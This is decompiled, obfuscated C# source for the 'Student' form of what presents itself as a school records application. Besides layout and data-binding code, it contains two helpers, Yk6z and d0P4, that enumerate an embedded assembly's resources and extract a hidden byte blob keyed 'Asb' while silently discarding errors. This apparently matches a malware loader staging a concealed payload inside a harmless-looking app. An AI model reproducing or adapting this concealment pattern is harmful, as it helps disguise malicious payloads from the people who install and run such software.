using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Bg5s;
using Microsoft.VisualBasic.CompilerServices;
using Re2;
using To59;
using Wp86;
using a6W4;
using c9Q5;
using n0AL;
using q4F8;
using x5X;
using z6N;

namespace w0XP;

[DesignerGenerated]
public class Td41 : Form
{
	private Ck89 _Database1DataSet;

	private BindingSource _HistoryBindingSource;

	private Cd8 _HistoryTableAdapter;

	private x0TX _SloginTableAdapter;

	private LinkLabel _LinkLabel1;

	private Panel _PanelTitleBar;

	private Pt4.Fo7 _IconButton2;

	private Pt4.Fo7 _IconButton1;

	private Label _lblFormTitle;

	private Pt4.j0H _IconCurrentForm;

	private Pt4.Fo7 _IconButton5;

	private Pt4.Fo7 _IconButton4;

	private Pt4.Fo7 _IconButton3;

	private Label _Student_IDLabel1;

	private Pt4.Fo7 _IconButton6;

	private Pt4.Fo7 currentBtn;

	private Panel leftBorderBtn;

	internal IContainer v;

	internal Panel K;

	internal n0QH S;

	internal BindingSource T;

	internal Panel D;

	internal Label X;

	internal Form I;

	protected override void Bf14(bool n8JM)
	{
		try
		{
			if (n8JM && v != null)
			{
				v.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(n8JM);
		}
	}

	private void Gc4y()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Expected O, but got Unknown
		//IL_00e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ea: Expected O, but got Unknown
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Expected O, but got Unknown
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0101: Expected O, but got Unknown
		//IL_02bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c9: Expected O, but got Unknown
		//IL_0379: Unknown result type (might be due to invalid IL or missing references)
		//IL_0383: Expected O, but got Unknown
		IContainer container = (v = new Container());
		By0b(new Panel());
		r8H2(new Label());
		e4W1(new BindingSource(v));
		Ci51(new Ck89());
		t3M4(new Label());
		w7H8(new Pt4.Fo7());
		o2TC(new Pt4.Fo7());
		y6D1(new LinkLabel());
		Ag6p(new BindingSource(v));
		t6JT(new Cd8());
		Fb56(new n0QH());
		x8S0(new x0TX());
		Js4b(new Panel());
		Wj8n(new Pt4.Fo7());
		b6C7(new Pt4.Fo7());
		Gk3w(new Pt4.Fo7());
		Yi5t(new Label());
		Cq95(new Pt4.j0H());
		j8S6(new Panel());
		Wp38(new Pt4.Fo7());
		Label val = new Label();
		Label val2 = new Label();
		((Control)j4MR()).SuspendLayout();
		((ISupportInitialize)r8F7()).BeginInit();
		((ISupportInitialize)r8J2()).BeginInit();
		((ISupportInitialize)Ee8p()).BeginInit();
		((Control)Hs2i()).SuspendLayout();
		((ISupportInitialize)(object)o6MK()).BeginInit();
		((Control)this).SuspendLayout();
		val.set_AutoSize(true);
		((Control)val).set_Location(new Point(28, 96));
		((Control)val).set_Name("Student_IDLabel");
		((Control)val).set_Size(new Size(61, 13));
		((Control)val).set_TabIndex(5);
		val.set_Text("Student ID:");
		val2.set_AutoSize(true);
		((Control)val2).set_Location(new Point(28, 141));
		((Control)val2).set_Name("NameLabel");
		((Control)val2).set_Size(new Size(38, 13));
		((Control)val2).set_TabIndex(6);
		val2.set_Text("Name:");
		((Control)j4MR()).set_BackColor(Color.FromArgb(31, 30, 68));
		((Control)j4MR()).get_Controls().Add((Control)(object)val2);
		((Control)j4MR()).get_Controls().Add((Control)(object)s9GB());
		((Control)j4MR()).get_Controls().Add((Control)(object)val);
		((Control)j4MR()).get_Controls().Add((Control)(object)t9DB());
		((Control)j4MR()).get_Controls().Add((Control)(object)Ns03());
		((Control)j4MR()).set_Dock((DockStyle)3);
		((Control)j4MR()).set_Location(new Point(0, 0));
		((Control)j4MR()).set_Name("PanelMenu");
		((Control)j4MR()).set_Size(new Size(243, 395));
		((Control)j4MR()).set_TabIndex(4);
		((Control)s9GB()).get_DataBindings().Add(new Binding("Text", (object)r8F7(), "Name", true));
		((Control)s9GB()).set_Location(new Point(72, 141));
		((Control)s9GB()).set_Name("NameLabel1");
		((Control)s9GB()).set_Size(new Size(100, 23));
		((Control)s9GB()).set_TabIndex(7);
		s9GB().set_Text("Label1");
		r8F7().set_DataMember("Slogin");
		r8F7().set_DataSource((object)r8J2());
		r8J2().DataSetName = "Database1DataSet";
		r8J2().SchemaSerializationMode = SchemaSerializationMode.IncludeSchema;
		((Control)t9DB()).get_DataBindings().Add(new Binding("Text", (object)r8F7(), "Student_ID", true));
		((Control)t9DB()).set_Location(new Point(95, 96));
		((Control)t9DB()).set_Name("Student_IDLabel1");
		((Control)t9DB()).set_Size(new Size(100, 23));
		((Control)t9DB()).set_TabIndex(6);
		t9DB().set_Text("Label1");
		((Label)Ns03()).set_AutoSize(true);
		((Control)Ns03()).set_ForeColor(Color.Gainsboro);
		((Control)Ns03()).set_Location(new Point(12, 9));
		((Control)Ns03()).set_Name("LinkLabel1");
		((Control)Ns03()).set_Size(new Size(32, 13));
		((Control)Ns03()).set_TabIndex(4);
		Ns03().set_TabStop(true);
		Ns03().set_Text("Back");
		Ee8p().set_DataMember("History");
		Ee8p().set_DataSource((object)r8J2());
		Bc04().ClearBeforeFill = true;
		c5Q0().BackupDataSetBeforeUpdate = false;
		c5Q0().FloginTableAdapter = null;
		c5Q0().HistoryTableAdapter = Bc04();
		c5Q0().PendingTableAdapter = null;
		c5Q0().ScheduleTableAdapter = null;
		c5Q0().SloginTableAdapter = null;
		c5Q0().TableTableAdapter = null;
		c5Q0().UpdateOrder = n0QH.y9Q.InsertUpdateDelete;
		Wr78().ClearBeforeFill = true;
		((Control)Hs2i()).set_BackColor(Color.FromArgb(31, 30, 68));
		((Control)Hs2i()).set_Dock((DockStyle)1);
		((Control)Hs2i()).set_Location(new Point(243, 0));
		((Control)Hs2i()).set_Name("PanelTitleBar");
		((Control)Hs2i()).set_Size(new Size(668, 96));
		((Control)Hs2i()).set_TabIndex(7);
		Rc40().set_AutoSize(true);
		((Control)Rc40()).set_ForeColor(Color.Gainsboro);
		((Control)Rc40()).set_Location(new Point(74, 42));
		((Control)Rc40()).set_Name("lblFormTitle");
		((Control)Rc40()).set_Size(new Size(39, 13));
		((Control)Rc40()).set_TabIndex(1);
		Rc40().set_Text("Label1");
		((Control)r9CW()).set_Dock((DockStyle)5);
		((Control)r9CW()).set_Location(new Point(243, 96));
		((Control)r9CW()).set_Name("PanelDesktop");
		((Control)r9CW()).set_Size(new Size(668, 299));
		((Control)r9CW()).set_TabIndex(8);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(911, 395));
		((Control)this).get_Controls().Add((Control)(object)r9CW());
		((Control)this).get_Controls().Add((Control)(object)Hs2i());
		((Control)this).get_Controls().Add((Control)(object)j4MR());
		((Control)this).set_Name("Student");
		((Form)this).set_Text("Student");
		((Control)j4MR()).ResumeLayout(false);
		((Control)j4MR()).PerformLayout();
		((ISupportInitialize)r8F7()).EndInit();
		((ISupportInitialize)r8J2()).EndInit();
		((ISupportInitialize)Ee8p()).EndInit();
		((Control)Hs2i()).ResumeLayout(false);
		((Control)Hs2i()).PerformLayout();
		((ISupportInitialize)(object)o6MK()).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual Panel j4MR()
	{
		return K;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void By0b(Panel p8LB)
	{
		Panel val = (K = p8LB);
	}

	[SpecialName]
	internal virtual Ck89 r8J2()
	{
		return _Database1DataSet;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ci51(Ck89 Gw5k)
	{
		_Database1DataSet = Gw5k;
	}

	[SpecialName]
	internal virtual BindingSource Ee8p()
	{
		return _HistoryBindingSource;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ag6p(BindingSource Dj13)
	{
		_HistoryBindingSource = Dj13;
	}

	[SpecialName]
	internal virtual Cd8 Bc04()
	{
		return _HistoryTableAdapter;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t6JT(Cd8 Ff2b)
	{
		_HistoryTableAdapter = Ff2b;
	}

	[SpecialName]
	internal virtual n0QH c5Q0()
	{
		return S;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fb56(n0QH t5X3)
	{
		n0QH n0QH = (S = t5X3);
	}

	[SpecialName]
	internal virtual BindingSource r8F7()
	{
		return T;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e4W1(BindingSource Tb7z)
	{
		BindingSource val = (T = Tb7z);
	}

	[SpecialName]
	internal virtual x0TX Wr78()
	{
		return _SloginTableAdapter;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x8S0(x0TX Ky32)
	{
		_SloginTableAdapter = Ky32;
	}

	[SpecialName]
	internal virtual LinkLabel Ns03()
	{
		return _LinkLabel1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y6D1(LinkLabel a0QT)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(Dw9i);
		LinkLabel linkLabel = _LinkLabel1;
		if (linkLabel != null)
		{
			linkLabel.remove_LinkClicked(val);
		}
		_LinkLabel1 = a0QT;
		linkLabel = _LinkLabel1;
		if (linkLabel != null)
		{
			linkLabel.add_LinkClicked(val);
		}
	}

	[SpecialName]
	internal virtual Panel Hs2i()
	{
		return _PanelTitleBar;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Js4b(Panel n4A9)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		MouseEventHandler val = new MouseEventHandler(Lk7g);
		Panel panelTitleBar = _PanelTitleBar;
		if (panelTitleBar != null)
		{
			((Control)panelTitleBar).remove_MouseDown(val);
		}
		_PanelTitleBar = n4A9;
		panelTitleBar = _PanelTitleBar;
		if (panelTitleBar != null)
		{
			((Control)panelTitleBar).add_MouseDown(val);
		}
	}

	[SpecialName]
	internal virtual Panel r9CW()
	{
		return D;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j8S6(Panel Jr7f)
	{
		Panel val = (D = Jr7f);
	}

	[SpecialName]
	internal virtual Pt4.Fo7 q3X4()
	{
		return _IconButton2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void w7H8(Pt4.Fo7 w8K5)
	{
		Pt4.Fo7.f1M f1M = Fe28;
		_IconButton2?.Wm7(f1M);
		_IconButton2 = w8K5;
		_IconButton2?.x5Y(f1M);
	}

	[SpecialName]
	internal virtual Pt4.Fo7 Rz7n()
	{
		return _IconButton1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o2TC(Pt4.Fo7 c2PQ)
	{
		Pt4.Fo7.f1M f1M = f5Q2;
		_IconButton1?.Wm7(f1M);
		_IconButton1 = c2PQ;
		_IconButton1?.x5Y(f1M);
	}

	[SpecialName]
	internal virtual Label Rc40()
	{
		return _lblFormTitle;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yi5t(Label Da05)
	{
		_lblFormTitle = Da05;
	}

	[SpecialName]
	internal virtual Pt4.j0H o6MK()
	{
		return _IconCurrentForm;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cq95(Pt4.j0H Nt2m)
	{
		_IconCurrentForm = Nt2m;
	}

	[SpecialName]
	internal virtual Pt4.Fo7 r5M9()
	{
		return _IconButton5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Wj8n(Pt4.Fo7 w4YN)
	{
		Pt4.Fo7.f1M f1M = w5BK;
		_IconButton5?.Wm7(f1M);
		_IconButton5 = w4YN;
		_IconButton5?.x5Y(f1M);
	}

	[SpecialName]
	internal virtual Pt4.Fo7 Ft2i()
	{
		return _IconButton4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b6C7(Pt4.Fo7 Ye79)
	{
		Pt4.Fo7.f1M f1M = t6E9;
		_IconButton4?.Wm7(f1M);
		_IconButton4 = Ye79;
		_IconButton4?.x5Y(f1M);
	}

	[SpecialName]
	internal virtual Pt4.Fo7 Ys7c()
	{
		return _IconButton3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gk3w(Pt4.Fo7 Ew7e)
	{
		Pt4.Fo7.f1M f1M = n9AP;
		_IconButton3?.Wm7(f1M);
		_IconButton3 = Ew7e;
		_IconButton3?.x5Y(f1M);
	}

	[SpecialName]
	internal virtual Label s9GB()
	{
		return X;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r8H2(Label i7P6)
	{
		Label val = (X = i7P6);
	}

	[SpecialName]
	internal virtual Label t9DB()
	{
		return _Student_IDLabel1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t3M4(Label Qr68)
	{
		_Student_IDLabel1 = Qr68;
	}

	[SpecialName]
	internal virtual Pt4.Fo7 Fy3s()
	{
		return _IconButton6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Wp38(Pt4.Fo7 g0E8)
	{
		Pt4.Fo7.f1M f1M = o1N0;
		_IconButton6?.Wm7(f1M);
		_IconButton6 = g0E8;
		_IconButton6?.x5Y(f1M);
	}

	public Td41()
	{
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		((Control)this).add_Resize((EventHandler)o2X1);
		((Form)this).add_Load((EventHandler)t0S7);
		Gc4y();
		leftBorderBtn = new Panel();
		((Control)leftBorderBtn).set_Size(new Size(7, 60));
		((Control)j4MR()).get_Controls().Add((Control)(object)leftBorderBtn);
		((Form)this).set_Text(string.Empty);
		((Form)this).set_ControlBox(false);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_MaximizedBounds(Screen.get_PrimaryScreen().get_WorkingArea());
	}

	private void i7D9(object y9A0, Color Jp57)
	{
		if (y9A0 != null)
		{
			e2AR();
			((Control)leftBorderBtn).set_BackColor(Jp57);
			((Control)leftBorderBtn).set_Visible(true);
			((Control)leftBorderBtn).BringToFront();
		}
	}

	private void e2AR()
	{
		if (currentBtn != null)
		{
		}
	}

	internal static string[] Yk6z()
	{
		List<string> list = new List<string>();
		int num = 0;
		string[] manifestResourceNames = ((Assembly)t2P.mDic["bee"]).GetManifestResourceNames();
		foreach (string item in manifestResourceNames)
		{
			list.Add(item);
		}
		checked
		{
			string[] array = new string[list.Count - 1 + 1];
			int num2 = array.Length - 1;
			for (num = 0; num <= num2; num++)
			{
				array[num] = list[num];
			}
			return array;
		}
	}

	private void Lo05(Form Gt83)
	{
		if (I != null)
		{
			I.Close();
		}
		Form val = (I = Gt83);
		Gt83.set_TopLevel(false);
		Gt83.set_FormBorderStyle((FormBorderStyle)0);
		((Control)Gt83).set_Dock((DockStyle)5);
		((Control)r9CW()).get_Controls().Add((Control)(object)Gt83);
		((Control)r9CW()).set_Tag((object)Gt83);
		((Control)Gt83).BringToFront();
		((Control)Gt83).Show();
		Rc40().set_Text(Gt83.get_Text());
	}

	[DllImport("user32.DLL")]
	private static extern void ReleaseCapture();

	[DllImport("user32.DLL")]
	private static extern void SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);

	private void Lk7g(object sender, MouseEventArgs e)
	{
		ReleaseCapture();
		SendMessage(((Control)this).get_Handle(), 274, 61458, 0);
	}

	private void o2X1(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)((Form)this).get_WindowState() == 2)
		{
			((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		}
		else
		{
			((Form)this).set_FormBorderStyle((FormBorderStyle)4);
		}
	}

	private void f5Q2(object sender, EventArgs e)
	{
		i7D9(RuntimeHelpers.GetObjectValue(sender), Fw90.color6);
		Lo05((Form)(object)new s9R8());
	}

	private void n9AP(object sender, EventArgs e)
	{
		((Form)this).set_WindowState((FormWindowState)1);
	}

	private void t6E9(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)((Form)this).get_WindowState() == 0)
		{
			((Form)this).set_WindowState((FormWindowState)2);
		}
		else
		{
			((Form)this).set_WindowState((FormWindowState)0);
		}
	}

	private void w5BK(object sender, EventArgs e)
	{
		Application.Exit();
	}

	private void Dw9i(object sender, LinkLabelLinkClickedEventArgs e)
	{
		((Control)d7H8.Forms.b1Y5()).Show();
		((Form)this).Close();
	}

	private void Fe28(object sender, EventArgs e)
	{
		i7D9(RuntimeHelpers.GetObjectValue(sender), Fw90.color6);
		Lo05((Form)(object)new t2P());
	}

	private void t0S7(object sender, EventArgs e)
	{
	}

	private void o1N0(object sender, EventArgs e)
	{
		i7D9(RuntimeHelpers.GetObjectValue(sender), Fw90.color6);
		Lo05((Form)(object)new Aw27());
	}

	internal static byte[] d0P4(string[] e6L1, int Ke73)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[e6L1.Length - 1 + 1];
				int num = e6L1.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						array[i] = e6L1[i].Replace(".resources", "");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)t2P.mDic["bee"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.CompareString(dictionaryEntry.Key.ToString(), "Asb", false) == 0)
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
